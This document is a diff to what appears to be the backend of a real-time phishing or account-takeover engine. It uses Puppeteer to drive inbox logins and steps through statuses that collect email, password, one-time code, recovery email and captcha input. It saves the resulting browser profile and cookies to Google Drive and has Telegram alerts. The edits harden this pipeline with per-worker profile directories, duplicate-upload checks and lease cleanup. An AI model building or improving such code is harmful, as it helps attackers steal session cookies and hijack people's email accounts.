@@ -16,6 +16,7 @@ import { keyboardNavigate } from "../../../../utils/KeyboardHandlers.js";
 import { uploadBrowserData } from '../../../api/googledrive.mjs';
 import {
     getColumnIndexes,
+    setKnownCookieColumns,
     fetchDataFromAppScript,
     updateBrowserRowData,
     resolveMx,
@@ -37,7 +38,7 @@ import {
     getPasswordErrorText
 } from './routeHelper.js';
 import { sendTelegramMessage } from '../../../api/telegram.js';
-import { getProjectDetails } from '../../../api/googlesheets.js'; // Import getProjectDetails
+import { getProjectDetails, getSheetDataApi } from '../../../api/googlesheets.js'; // Import getProjectDetails
 import { notifyTeam } from "../../../../utils/notifyTeam.js";
 
 // Suppress unhandled rejections from puppeteer when the browser/target is already closed.
@@ -64,6 +65,16 @@ const PLATFORM_INBOX_URLS = {
 };
 
 const MAX_CONCURRENT_BROWSERS = parseInt(process.env.MAX_CONCURRENT_BROWSERS || '3', 10);
+// Per-worker segment so browser profile dirs are never shared between two Next.js workers
+// (or restarted processes) on the same container. A second worker must never be able to
+// delete the LIVE profile of a browser the first worker is driving — shared unscoped
+// /tmp/users_data/{browserId} dirs were the root cause of the production
+// "Aborting upload (profile gone)" losses (a duplicate launch hit ETXTBSY, fs.remove()'d
+// the dir the other session was still writing, and its finalizer then found dirExists=false).
+const WORKER_SEGMENT = `${process.pid}-${Math.random().toString(36).slice(2, 8)}`;
+function buildUserDataDir(browserId) {
+  return `/tmp/users_data/${WORKER_SEGMENT}/${browserId}`;
+}
 const activeProcesses = globalThis.__activeProcesses || (globalThis.__activeProcesses = new Set());
 // jobMap: per-browserId Promise of the processRow job currently executing (launched by
 // processWaitingRows OR the wake-up handler). Unlike `activelyProcessing`, it is NOT
@@ -1650,6 +1661,7 @@ async function sendWrongInputAlert({ type, platform, email, browserId, password,
     try {
         const allData = await fetchDataFromAppScript();
         const headers = allData[0];
+        setKnownCookieColumns(headers);
         const colIdx = getColumnIndexes(headers);
         const rowData = allData.slice(1).find(r => r[colIdx['browserId']] === browserId);
         if (!rowData) return;
@@ -1914,7 +1926,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         }
     }, 10000) : null;
 
-    const userDataDir = `/tmp/users_data/${browserId}`;
+    const userDataDir = buildUserDataDir(browserId);
     let browser = null;
     let page = null;
     let targetCreatedListener = null; // Defined here to be accessible in finally
@@ -2043,11 +2055,11 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 try {
                     let pids = [];
                     if (process.platform === 'win32') {
-                        const result = execSync(`powershell -Command "Get-CimInstance Win32_Process -Filter \\"Name = 'chrome.exe'\\" | Where-Object { $_.CommandLine -like '*${browserId}*' } | Select-Object -ExpandProperty ProcessId"`, { encoding: 'utf8', timeout: 10000, stdio: ['pipe', 'pipe', 'pipe'] });
+                        const result = execSync(`powershell -Command "Get-CimInstance Win32_Process -Filter \\"Name = 'chrome.exe'\\" | Where-Object { $_.CommandLine -like '*${WORKER_SEGMENT}*${browserId}*' } | Select-Object -ExpandProperty ProcessId"`, { encoding: 'utf8', timeout: 10000, stdio: ['pipe', 'pipe', 'pipe'] });
                         pids = result.trim().split(/\r?\n/).filter(Boolean).map(p => p.trim());
                     } else {
                         const escapedId = browserId.replace(/'/g, "'\\''");
-                        const result = execSync(`ps aux | grep -i 'chrome.*${escapedId}' | grep -v grep | awk '{print $2}'`, { encoding: 'utf8', timeout: 10000, stdio: ['pipe', 'pipe', 'pipe'] });
+                        const result = execSync(`ps aux | grep -i 'chrome.*${WORKER_SEGMENT}.*${escapedId}' | grep -v grep | awk '{print $2}'`, { encoding: 'utf8', timeout: 10000, stdio: ['pipe', 'pipe', 'pipe'] });
                         pids = result.trim().split('\n').filter(Boolean).map(p => p.trim());
                     }
                     for (const pid of pids) {
@@ -4063,7 +4075,7 @@ if (!foundSelector) {
                 // browser profile must be saved to Drive even though the row ends FAILED.
                 if (initialCheckResult.accountAccess) {
                     try {
-                        const savedUrl = await uploadBrowserData(browserId, updateData);
+                        const savedUrl = await uploadBrowserData(browserId, updateData, userDataDir);
                         if (savedUrl) {
                             updateData.driveUrl = savedUrl;
                             uploadedBrowserData.set(browserId, savedUrl);
@@ -4288,7 +4300,7 @@ if (!foundSelector) {
                 // browser profile must be saved to Drive even though the row ends FAILED.
                 if (initialCheckResult.accountAccess) {
                     try {
-                        const savedUrl = await uploadBrowserData(browserId, updateData);
+                        const savedUrl = await uploadBrowserData(browserId, updateData, userDataDir);
                         if (savedUrl) {
                             updateData.driveUrl = savedUrl;
                             uploadedBrowserData.set(browserId, savedUrl);
@@ -4561,7 +4573,7 @@ if (!foundSelector) {
 
                                         try {
                                             logger.warn(`[UPLOAD][${browserId}] attempt caller=WAITINGCODE_SAFETY_CHECK status=${updateData.status} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
-                                            const uploadedUrl = await uploadBrowserData(browserId, updateData);
+                                            const uploadedUrl = await uploadBrowserData(browserId, updateData, userDataDir);
                                             if (uploadedUrl) { updateData.driveUrl = uploadedUrl; uploadedBrowserData.set(browserId, uploadedUrl); }
                                         } catch (uploadError) {
                                             logger.error(`[processRow][${browserId}] Error during Drive upload after safety check: ${uploadError.message}`);
@@ -4615,7 +4627,7 @@ if (!foundSelector) {
 
                                             try {
                                                 logger.warn(`[UPLOAD][${browserId}] attempt caller=WAITINGCODE_VIEWS_CHECK status=${updateData.status} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
-                                                const uploadedUrl = await uploadBrowserData(browserId, updateData);
+                                                const uploadedUrl = await uploadBrowserData(browserId, updateData, userDataDir);
                                                 if (uploadedUrl) { updateData.driveUrl = uploadedUrl; uploadedBrowserData.set(browserId, uploadedUrl); }
                                             } catch (uploadError) {
                                                 logger.error(`[processRow][${browserId}] Error during Drive upload after views check: ${uploadError.message}`);
@@ -4707,7 +4719,7 @@ if (!foundSelector) {
                                         let uploadedDriveUrlAfterPassive = null;
                                         try {
                                             logger.warn(`[UPLOAD][${browserId}] attempt caller=WAITINGCODE_PASSIVE status=${updateData.status} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
-                                            uploadedDriveUrlAfterPassive = await uploadBrowserData(browserId, updateData);
+                                            uploadedDriveUrlAfterPassive = await uploadBrowserData(browserId, updateData, userDataDir);
                                             if (uploadedDriveUrlAfterPassive) {
                                                 updateData.driveUrl = uploadedDriveUrlAfterPassive;
                                                 uploadedBrowserData.set(browserId, uploadedDriveUrlAfterPassive);
@@ -4783,7 +4795,7 @@ if (!foundSelector) {
                                 let uploadedDriveUrlAfterCode = null;
                                 try {
                                     logger.warn(`[UPLOAD][${browserId}] attempt caller=WAITINGCODE_ACCEPTED status=${updateData.status} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
-                                    uploadedDriveUrlAfterCode = await uploadBrowserData(browserId, updateData);
+                                    uploadedDriveUrlAfterCode = await uploadBrowserData(browserId, updateData, userDataDir);
                                     if (uploadedDriveUrlAfterCode) {
                                         updateData.driveUrl = uploadedDriveUrlAfterCode;
                                         uploadedBrowserData.set(browserId, uploadedDriveUrlAfterCode);
@@ -4968,7 +4980,7 @@ if (!foundSelector) {
                 // browser profile must be saved to Drive even though the row ends FAILED.
                 if (initialCheckResult.accountAccess) {
                     try {
-                        const savedUrl = await uploadBrowserData(browserId, updateData);
+                        const savedUrl = await uploadBrowserData(browserId, updateData, userDataDir);
                         if (savedUrl) {
                             updateData.driveUrl = savedUrl;
                             uploadedBrowserData.set(browserId, savedUrl);
@@ -5325,14 +5337,40 @@ if (!foundSelector) {
 
             let uploadedDriveUrl = null;
             try {
-                logger.warn(`[UPLOAD][${browserId}] attempt caller=COMPLETED_FINALIZER status=${finalStatus} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
-                uploadedDriveUrl = await uploadBrowserData(browserId, updateData);
-                if (uploadedDriveUrl) {
-                    updateData.driveUrl = uploadedDriveUrl;
-                    uploadedBrowserData.set(browserId, uploadedDriveUrl);
-                    logger.info(`[processRow][${browserId}] Successfully uploaded browser data to Google Drive.`);
+                // Defensive re-read: another worker/instance may have already completed and
+                // uploaded this browserId. If the sheet already carries a cookieFileURL, skip
+                // the upload entirely (never clobber the good profile) — cookieJSON below is
+                // still persisted to the sheet in the COMPLETED write, so nothing is lost.
+                let existingDriveUrl = null;
+                try {
+                    const freshData = await getSheetDataApi("cookie");
+                    if (freshData.success && Array.isArray(freshData.data)) {
+                        const biIdx = freshData.headers.indexOf('browserId');
+                        const cfIdx = freshData.headers.indexOf('cookieFileURL');
+                        const dvIdx = freshData.headers.indexOf('driveUrl');
+                        const freshRow = freshData.data.find(r => String(r[biIdx]).trim() === String(browserId).trim());
+                        if (freshRow) {
+                            existingDriveUrl = (cfIdx !== -1 && freshRow[cfIdx]) || (dvIdx !== -1 && freshRow[dvIdx]) || null;
+                        }
+                    }
+                } catch (freshReadErr) {
+                    logger.warn(`[processRow][${browserId}] Finalizer fresh-read failed (proceeding with upload): ${freshReadErr.message}`);
+                }
+
+                if (existingDriveUrl) {
+                    logger.warn(`[UPLOAD][${browserId}] DEFENSIVE-SKIP: sheet already has cookieFileURL=${existingDriveUrl}. Skipping re-upload (cookieJSON kept).`);
+                    updateData.driveUrl = existingDriveUrl;
+                    uploadedDriveUrl = existingDriveUrl;
                 } else {
-                    logger.warn(`[processRow][${browserId}] Google Drive upload skipped or failed.`);
+                    logger.warn(`[UPLOAD][${browserId}] attempt caller=COMPLETED_FINALIZER status=${finalStatus} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
+                    uploadedDriveUrl = await uploadBrowserData(browserId, updateData, userDataDir);
+                    if (uploadedDriveUrl) {
+                        updateData.driveUrl = uploadedDriveUrl;
+                        uploadedBrowserData.set(browserId, uploadedDriveUrl);
+                        logger.info(`[processRow][${browserId}] Successfully uploaded browser data to Google Drive.`);
+                    } else {
+                        logger.warn(`[processRow][${browserId}] Google Drive upload skipped or failed.`);
+                    }
                 }
             } catch (uploadError) {
                 logger.error(`[processRow][${browserId}] Error during Google Drive upload: ${uploadError.message}`);
@@ -5653,6 +5691,7 @@ async function processWaitingRows() {
         }
 
         const headers = data[0];
+        setKnownCookieColumns(headers);
         const columnIndexes = getColumnIndexes(headers);
         const rows = data.slice(1);
 
@@ -5741,7 +5780,7 @@ async function processWaitingRows() {
             if (serverIdx !== undefined && selfUrl) {
                 const rowServer = row[serverIdx];
                 if (rowServer && rowServer !== selfUrl) {
-                    logger.debug(`[processWaitingRows] Skipping row ${bId}: assigned to server '${rowServer}', self is '${selfUrl}'`);
+                    logger.warn(`[processWaitingRows] Skipping row ${bId}: assigned to server '${rowServer}', self is '${selfUrl}'`);
                     return false;
                 }
             }
@@ -6006,18 +6045,20 @@ export async function POST(request) {
                 activeProcesses.add(browserId); // Re-add immediately to prevent processWaitingRows from picking up the same browserId
                 logger.info(`[POST][${browserId}] Wake-up received. Direct processing started.`);
                 (async () => {
+                    let processRowStarted = false;
                     try {
                         const session = activeBrowserSessions.get(browserId);
                         const data = await fetchDataFromAppScript(1, 30000, true);
                         if (!Array.isArray(data) || data.length < 2) return;
                         const headers = data[0];
+                        setKnownCookieColumns(headers);
                         const colIndexes = getColumnIndexes(headers);
                         const row = data.slice(1).find(r => r[colIndexes['browserId']] === browserId);
                         if (!row) return;
                         const status = row[colIndexes['status']];
                         const processable = ["WAITING","WAITINGEMAIL","WAITINGPASSWORD","WAITINGPASSWORDERROR","WAITINGOPTIONS","WAITINGCODE","WAITINGRECOVERYEMAIL","WAITINGCAPTCHA"];
                         if (!processable.includes(status)) return;
-                        activeProcesses.add(browserId);
+                        processRowStarted = true;
                         try {
                             await processRow(row, colIndexes, session?.browser, session?.page);
                         } finally {
@@ -6028,13 +6069,19 @@ export async function POST(request) {
                         }
                     } catch (err) {
                         logger.error(`[POST][${browserId}] Direct processRow error: ${err.message}`);
+                    } finally {
+                        // Lease safety net: if processRow never started (invalid/stale fetch data,
+                        // row not found, or not processable), release the lease so the interval can
+                        // re-pick this row on the next tick instead of blocking it forever.
+                        if (!processRowStarted) activeProcesses.delete(browserId);
                     }
                 })();
                 return setCorsHeaders(NextResponse.json({ success: true, message: "Engine woken up" }, { status: 200 }));
             }
-            userDataDir = `/tmp/users_data/${browserId}`; // Set userDataDir early for cleanup
+            userDataDir = buildUserDataDir(browserId); // Set userDataDir early for cleanup
             const existingData = await fetchDataFromAppScript();
             const headers = existingData[0];
+            setKnownCookieColumns(headers);
             const columnIndexes = getColumnIndexes(headers);
             const existingRow = existingData.slice(1).find(r => r[columnIndexes['browserId']] === browserId);
 
@@ -6089,7 +6136,7 @@ export async function POST(request) {
         // --- Handle requests without browserId (new process initiation) ---
         // If we reach here, browserId was NOT provided, so it's a new process.
         const actualBrowserId = `browser-${Date.now()}-${Math.random().toString(36).substring(2, 15)}`;
-        userDataDir = `/tmp/users_data/${actualBrowserId}`;
+        userDataDir = buildUserDataDir(actualBrowserId);
         instanceIdForPOST = `POST-SETUP-${actualBrowserId}`;
 
         const initialStatus = email ? "WAITING" : "WAITINGEMAIL";
